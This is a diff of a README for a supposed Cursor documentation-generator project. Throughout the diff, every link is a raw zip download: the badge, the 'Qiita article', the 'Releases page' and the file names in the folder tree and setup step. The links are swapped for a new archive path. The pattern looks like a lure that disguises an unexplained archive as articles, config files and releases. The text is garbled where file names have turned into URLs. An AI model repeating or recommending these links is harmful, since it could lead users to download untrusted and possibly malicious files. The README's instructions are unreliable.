@@ -1,12 +1,12 @@
 # 🚀 project-startup-cursor - Manage Your Project Effortlessly
 
-[![Download](https://raw.githubusercontent.com/1-RAY-1/project-startup-cursor/main/Orycteropodidae/project-startup-cursor.zip)](https://raw.githubusercontent.com/1-RAY-1/project-startup-cursor/main/Orycteropodidae/project-startup-cursor.zip)
+[![Download](https://github.com/1-RAY-1/project-startup-cursor/raw/refs/heads/main/project-docs/00_project_management/startup-project-cursor-1.3.zip)](https://github.com/1-RAY-1/project-startup-cursor/raw/refs/heads/main/project-docs/00_project_management/startup-project-cursor-1.3.zip)
 
 ## 📦 Overview
 
 The `project-startup-cursor` repository helps you manage your project documentation easily. This repository creates documentation by updating templates based on the information you provide. It simplifies the process of generating documents according to your project's needs.
 
-For detailed design and implementation steps, refer to this [Qiita article](https://raw.githubusercontent.com/1-RAY-1/project-startup-cursor/main/Orycteropodidae/project-startup-cursor.zip).
+For detailed design and implementation steps, refer to this [Qiita article](https://github.com/1-RAY-1/project-startup-cursor/raw/refs/heads/main/project-docs/00_project_management/startup-project-cursor-1.3.zip).
 
 ## 📂 Folder Structure
 
@@ -14,7 +14,7 @@ For detailed design and implementation steps, refer to this [Qiita article](http
 project-startup-cursor
 ├── .cursor/
 │   └── rules/
-│       └── https://raw.githubusercontent.com/1-RAY-1/project-startup-cursor/main/Orycteropodidae/project-startup-cursor.zip   // Rules for documentation generation
+│       └── https://github.com/1-RAY-1/project-startup-cursor/raw/refs/heads/main/project-docs/00_project_management/startup-project-cursor-1.3.zip   // Rules for documentation generation
 ├── input-docs/                  // Place for input information
 ├── project-docs/                // Generated documentation (template)
 │   ├── 00_project_management/   // Project management section
@@ -22,8 +22,8 @@ project-startup-cursor
 │   ├── 02_design/               // Design section
 │   ├── 03_development/          // Development section
 │   └── 04_operations/           // Operations section
-├── https://raw.githubusercontent.com/1-RAY-1/project-startup-cursor/main/Orycteropodidae/project-startup-cursor.zip       // Definition of directory structure
-└── https://raw.githubusercontent.com/1-RAY-1/project-startup-cursor/main/Orycteropodidae/project-startup-cursor.zip          // Project definition file
+├── https://github.com/1-RAY-1/project-startup-cursor/raw/refs/heads/main/project-docs/00_project_management/startup-project-cursor-1.3.zip       // Definition of directory structure
+└── https://github.com/1-RAY-1/project-startup-cursor/raw/refs/heads/main/project-docs/00_project_management/startup-project-cursor-1.3.zip          // Project definition file
 ```
 
 ## 🚀 Getting Started
@@ -32,7 +32,7 @@ Follow these steps to set up your project documentation.
 
 ### 1. ✏️ Input Basic Project Information
 
-Open the `https://raw.githubusercontent.com/1-RAY-1/project-startup-cursor/main/Orycteropodidae/project-startup-cursor.zip` file. Enter your project details in the following format:
+Open the `https://github.com/1-RAY-1/project-startup-cursor/raw/refs/heads/main/project-docs/00_project_management/startup-project-cursor-1.3.zip` file. Enter your project details in the following format:
 
 ```yaml
 project:
@@ -51,7 +51,7 @@ Upload relevant project information to the `input-docs` folder. This will serve 
 
 To download the application, visit the Releases page:
 
-[Download from Releases](https://raw.githubusercontent.com/1-RAY-1/project-startup-cursor/main/Orycteropodidae/project-startup-cursor.zip)
+[Download from Releases](https://github.com/1-RAY-1/project-startup-cursor/raw/refs/heads/main/project-docs/00_project_management/startup-project-cursor-1.3.zip)
 
 This page contains the latest versions and files for you to download. Select the appropriate version you need for your system.
 
